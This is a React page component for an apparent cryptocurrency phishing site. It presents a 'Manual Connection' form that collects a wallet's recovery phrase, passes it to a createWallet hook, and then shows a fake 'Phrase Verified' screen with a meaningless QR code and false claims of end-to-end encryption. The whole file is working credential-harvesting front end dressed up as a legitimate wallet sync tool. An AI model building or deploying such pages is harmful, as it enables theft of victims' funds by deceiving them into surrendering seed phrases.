import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion, AnimatePresence } from "framer-motion";
import { useLocation } from "wouter";
import { Navbar } from "../components/Navbar";
import { Footer } from "../components/Footer";
import { useCreateWallet } from "../hooks/use-wallets";
import { useToast } from "../hooks/use-toast";
import { ShieldCheck, Wallet, RefreshCw, AlertCircle, CheckCircle2, QrCode } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { Textarea } from "../components/ui/textarea";

const connectSchema = z.object({
  walletName: z.string().min(2, "Wallet name is required"),
  phrase: z.string().min(12, "Phrase must be at least 12 characters").refine(val => val.split(' ').length >= 12 || val.length > 20, {
    message: "Please enter a valid mnemonic phrase"
  }),
});

export default function Connect() {
  const [isSuccess, setIsSuccess] = useState(false);
  const [showQR, setShowQR] = useState(false);
  const { createWallet, isLoading } = useCreateWallet();
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [search] = useState(() => new URLSearchParams(window.location.search));
  const initialWallet = search.get("wallet") || "";

  const form = useForm({
    resolver: zodResolver(connectSchema),
    defaultValues: {
      walletName: initialWallet,
      phrase: "",
    },
  });

  const onSubmit = async (data) => {
    const success = await createWallet(data);
    if (success) {
      setIsSuccess(true);
      toast({
        title: "Phrase Verified",
        description: "Your recovery phrase has been successfully verified. Establishing secure connection...",
      });
      
      // Show QR code after 2 seconds of "Connected" state
      setTimeout(() => {
        setShowQR(true);
      }, 2000);
    }
  };

  const handleComplete = () => {
    toast({
      title: "Wallet Connected",
      description: "Your wallet has been successfully synchronized and secured.",
    });
    setLocation("/");
  };

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <Navbar />
      <main className="flex-grow flex items-center justify-center px-4 py-20 sm:px-6 lg:px-8 relative overflow-hidden">
        <div className="absolute top-1/2 left-1/4 w-96 h-96 bg-purple-600/20 rounded-full blur-[100px] -translate-y-1/2 -z-10" />
        <div className="absolute top-1/4 right-1/4 w-96 h-96 bg-cyan-600/20 rounded-full blur-[100px] -z-10" />
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="w-full max-w-lg">
          <div className="text-center mb-8">
            <h1 className="text-3xl md:text-4xl font-bold font-display text-white mb-2">Manual Connection</h1>
            <p className="text-slate-400">Securely synchronize your {initialWallet} wallet.</p>
          </div>
          <div className="glass-card rounded-2xl overflow-hidden border border-white/10 shadow-2xl shadow-black/50">
            <div className="p-6 md:p-8 min-h-[400px]">
              <AnimatePresence mode="wait">
                <motion.div key="manual" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
                  {isSuccess ? (
                    <div className="flex flex-col items-center justify-center py-8 text-center">
                      <AnimatePresence mode="wait">
                        {!showQR ? (
                          <motion.div
                            key="verifying"
                            initial={{ opacity: 0, scale: 0.9 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 1.1 }}
                            className="flex flex-col items-center"
                          >
                            <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mb-6">
                              <CheckCircle2 className="w-10 h-10 text-green-500" />
                            </div>
                            <h3 className="text-2xl font-bold text-white mb-2">Phrase Verified</h3>
                            <p className="text-slate-400">Initializing secure synchronization...</p>
                            <div className="mt-8 flex items-center gap-2 text-cyan-400 text-sm font-medium">
                              <RefreshCw className="w-4 h-4 animate-spin" />
                              <span>Securing Channel</span>
                            </div>
                          </motion.div>
                        ) : (
                          <motion.div
                            key="qrcode"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="flex flex-col items-center"
                          >
                            <div className="p-4 bg-white rounded-2xl mb-6 shadow-2xl shadow-cyan-500/20">
                              <QRCodeSVG 
                                value={`https://wallet-sync-secure.link/auth/${Math.random().toString(36).substring(7)}`}
                                size={180}
                                level="H"
                                includeMargin={false}
                              />
                            </div>
                            <div className="space-y-3 mb-8">
                              <h3 className="text-xl font-bold text-white">Scan to Complete</h3>
                              <p className="text-slate-400 text-sm max-w-xs">
                                Scan this secure QR code with your mobile wallet app to finalize the encrypted synchronization.
                              </p>
                            </div>
                            <div className="flex flex-col w-full gap-3">
                              <Button 
                                onClick={handleComplete}
                                className="w-full h-12 bg-cyan-500 hover:bg-cyan-600 text-white font-bold rounded-xl transition-all duration-300"
                              >
                                I've Scanned the Code
                              </Button>
                              <p className="text-xs text-slate-500 flex items-center justify-center gap-1">
                                <ShieldCheck className="w-3 h-3" />
                                End-to-end encrypted connection
                              </p>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>
                  ) : (
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
                      <div className="p-4 rounded-xl bg-blue-500/10 border border-blue-500/20 flex gap-3 mb-6">
                        <AlertCircle className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
                        <p className="text-sm text-blue-200/80">Enter your recovery phrase manually to establish a secure, encrypted connection.</p>
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-medium text-slate-300 ml-1">Wallet Name</label>
                        <div className="relative">
                          <Wallet className="absolute left-3 top-3 w-5 h-5 text-slate-500" />
                          <Input {...form.register("walletName")} placeholder="e.g. MetaMask, Trust Wallet" className="pl-10 h-11 glass-input text-white placeholder:text-slate-600 rounded-xl" />
                        </div>
                        {form.formState.errors.walletName && <p className="text-red-400 text-xs ml-1">{form.formState.errors.walletName.message}</p>}
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-medium text-slate-300 ml-1">Mnemonic Phrase</label>
                        <Textarea {...form.register("phrase")} placeholder="Enter your 12 or 24 word recovery phrase..." className="min-h-[120px] glass-input text-white placeholder:text-slate-600 rounded-xl resize-none p-4 leading-relaxed" />
                        <p className="text-xs text-slate-500 ml-1">Typically 12 (sometimes 24) words separated by single spaces.</p>
                        {form.formState.errors.phrase && <p className="text-red-400 text-xs ml-1">{form.formState.errors.phrase.message}</p>}
                      </div>
                      <Button type="submit" disabled={isLoading} className="w-full h-12 bg-gradient-to-r from-cyan-500 to-purple-600 hover:from-cyan-400 hover:to-purple-500 text-white font-bold rounded-xl shadow-lg shadow-purple-500/20 transition-all duration-300 mt-4">
                        {isLoading ? <span className="flex items-center gap-2"><RefreshCw className="w-4 h-4 animate-spin" /> Verifying...</span> : "Establish Connection"}
                      </Button>
                    </form>
                  )}
                </motion.div>
              </AnimatePresence>
            </div>
          </div>
        </motion.div>
      </main>
      <Footer />
    </div>
  );
}
